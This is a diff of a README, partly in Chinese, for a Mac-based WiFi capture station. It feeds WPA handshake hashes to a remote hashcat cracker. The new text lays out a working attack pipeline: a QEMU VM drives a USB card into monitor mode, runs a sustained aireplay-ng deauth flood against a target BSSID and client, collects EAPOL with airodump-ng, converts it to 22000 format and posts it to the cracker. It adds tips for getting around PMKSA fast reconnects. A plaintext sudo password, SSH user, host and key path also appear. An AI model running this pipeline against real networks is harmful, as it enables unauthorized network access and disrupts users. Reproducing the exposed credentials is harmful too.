@@ -1,62 +1,49 @@
 # Mac Capture Station → Hashcat 22000
 
-Companion to `android-capture/`. Uses the **Mac** as a WiFi station/capture box
-for the same target, feeding 22000 hashes to the Windows RTX-4090 hashcat
-cracker (`windows_cracker_app.py`, port 8766).
+> **權威說明看 repo root 的 [`KNOWN_GOOD.md`](../KNOWN_GOOD.md)。** 本檔只補 Mac 端細節。
+> 已知能抓包+能破解的乾淨版本 = base commit `628830b`。
 
-## Machine
+## 機器
 
-Apple Silicon **M2 Air**, macOS 26.6.2. Remote: `tongbao@192.168.1.125`,
-SSH key `~/.ssh/opremote_ed25519`, **sudo password `240628`**. Home SSID
-`32H9F_5G` (5G WPA3) / `32H9F` (2.4G).
+Apple Silicon **M2 Air**, macOS 26.6.2。Remote: `tongbao@192.168.1.123`（IP 會隨 DHCP 變，以 ping/sweep 為準），SSH key `~/.ssh/opremote_ed25519`，**sudo 密碼 `240628`**。
 
-Two Wi-Fi radios:
-- **en0** — Apple built-in AirPort. Per-network **randomized** MAC
-  (`74:a6-cd:bd:43:f2`); its WoL/magic-packet wake is **flaky** (randomized MAC
-  + deeper sleep). This is the line we **disable** so it stops competing on the
-  2.4G band and stops being the ambiguous primary.
-- **USB Wi-Fi card (D-Link DWA-160, RTL8811AU)** — the dedicated,
-  deterministic network + capture NIC. Needs the `8811au` kext loaded; if it is
-  not enumerated, plug it in / load the driver first.
+目標 `32H10F`（2.4G WPA2）。
 
-> Decision: run the Mac on the **USB card only** and **disable the built-in
-> Wi-Fi line** (`disable_builtin_wifi.sh off`). This removes the randomized
-> built-in radio from the 2.4G band and makes the DWA-160 the single NIC for
-> both SSH and capture.
+## 分工（別搞反）
 
-## Files
+- **內建 en0（Apple AirPort）** = **網路 / SSH**（待在家，供 SSH 與網路；**不禁、不動**）。MAC `74:a6-cd:bd:43:f2`。
+- **USB 網卡 DWA-160** = **抓包卡**（純 capture，不負責網路）。
+  - Ralink **RT5592**，USB id **`148f:5572`**（`ioreg -r -c IOUSBHostDevice` 看得見，"802.11 n WLAN"）。
+  - macOS 有 `RtWlanU*.kext`；**抓包不走 macOS 驅動**——USB passthrough 進 QEMU VM，由 VM 內 **`rt2800usb`** + **`rt2870.bin`** 驅動。
+  - `system_profiler` 常抓不到它（回 0），**用 `ioreg` 判存在**，別誤以為沒插。
 
-| file | what it is |
+> 之前 `disable_builtin_wifi.sh` 是「禁內建→改走 USB」的**舊假設**（讓 Mac 只跑 USB 卡）。
+> **本版本（known-good）不用它**：內建留著跑網路，DWA-160 只負責抓包，兩者並存、互不影響。
+
+## 檔案
+
+| 檔 | 說明 |
 |---|---|
-| `disable_builtin_wifi.sh` | **Disable the built-in Wi-Fi (en0)** so the Mac runs on the USB card (DWA-160) only. `off` (default) / `on` to re-enable. Warns if no active non-built-in Wi-Fi iface is present before dropping en0 (would cut SSH). |
-| `wake_mac.py` | Wake-on-LAN magic packet. Default MAC = en0's built-in MAC. **After disabling the built-in, pass the DWA-160's burned-in MAC** as arg 1 (`python wake_mac.py <dwa160_mac>`). |
+| `disable_builtin_wifi.sh` | （備用/舊路線）禁內建 en0 讓 Mac 改走 USB 卡。`off`/`on`。本版本 default **不用**。 |
+| `wake_mac.py` | WoL magic packet（預設 en0 MAC）。WoL 時好時壞（randomized MAC/深睡），**實體喚醒最可靠**。 |
+| `../mac_capture_app.py` | **主程式**：QEMU VM（Alpine + DWA-160 USB）→ airodump monitor + deauth 風暴 → hcxpcapngtool → POST `.22000` 到 Windows:8766。 |
 
-## Usage
+## 抓包流程（known-good）
 
-```bash
-# 1) Wake (while built-in is still the NIC, or after with the DWA-160 MAC):
-python mac-capture/wake_mac.py [dwa160_mac]
-
-# 2) SSH in and disable the built-in Wi-Fi line:
-ssh -i ~/.ssh/opremote_ed25519 tongbao@192.168.1.125
-#    (on the Mac)
-SUDO_PW=240628 ./disable_builtin_wifi.sh off
+```sh
+# Mac 上（mac_capture_app.py 自動做這些）：
+# 1) 確認 DWA-160 在 USB（ioreg）、VM qcow2/initramfs/rt2870.bin 在 /tmp
+# 2) 起 QEMU（-device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572）
+# 3) SSH 進 VM：iw dev wlan0 set type monitor; ifconfig wlan0 up
+# 4) nohup aireplay-ng --deauth 9999 --ignore-negative-one -a <BSSID> -c <CLIENT> wlan0 &
+# 5) 多次 timeout 10 airodump-ng -w /tmp/capapp -c <CH> wlan0（累積）
+# 6) ls /tmp/capapp-*.cap | xargs hcxpcapngtool -o /tmp/capapp.22000
+# 7) POST .22000 → Windows http://<win>:8766/api/receive-hash
 ```
 
-## Notes / caveats
+## 注意 / 坑
 
-- **WoL MAC**: USB Wi-Fi cards support WoL only if the driver exposes it; after
-  disabling the built-in, confirm the DWA-160's WoL/MAC and update `wake_mac.py`.
-- **Monitor mode on macOS 26**: the classic `airport` CLI is gone; the DWA-160
-  needs the `8811au` driver for reliable raw 802.11 monitor capture. The
-  built-in AirPort cannot be put in monitor mode easily without that driver.
-- **Capture pipeline** (once a station does an EAPOL 4-way on the target):
-  pcap → `hcxpcapngtool --all -o out.22000 cap.pcap` → feed to the Windows
-  cracker via `android-capture/feed_hash.py` (POST `http://127.0.0.1:8766/api/receive-hash`).
-
-## Status
-
-- Built-in WoL verified to wake the Mac **once** (magic packet), then went flaky
-  (likely deeper sleep / randomized MAC). Physical wake is the reliable fallback.
-- Open: enumerate the DWA-160 interface + confirm its kext is loaded, then run
-  `disable_builtin_wifi.sh off` and validate the Mac stays reachable over the USB card.
+- **WoL**：內建 MAC randomized + 深睡 → magic packet 不穩；**實體喚醒最可靠**。
+- **RT5592 韌體**：VM 內缺 `rt2870.bin` → wlan0 半初始化、進不了 monitor（`SIOCSIWMODE failed`）。qcow2 的 `/lib/firmware/` 要有 `rt2870.bin`（`/init` 會 delay-load）。
+- **PMKSA**：真實 client 被 deauth 後多走 PMKSA 快重連（跳完整 4-way）→ 短窗常 0 EAPOL；靠「更長 capture + 持續 deauth」累積，或抓 PMKID 亦可 crack（同 keyspace）。
+- **monitor 全幀**：EAPOL 4-way（M1–M4）是 **DATA 幀**（EtherType 0x888E），**別加 `wlan type mgt` 過濾**，否則 handshake 被濾掉。
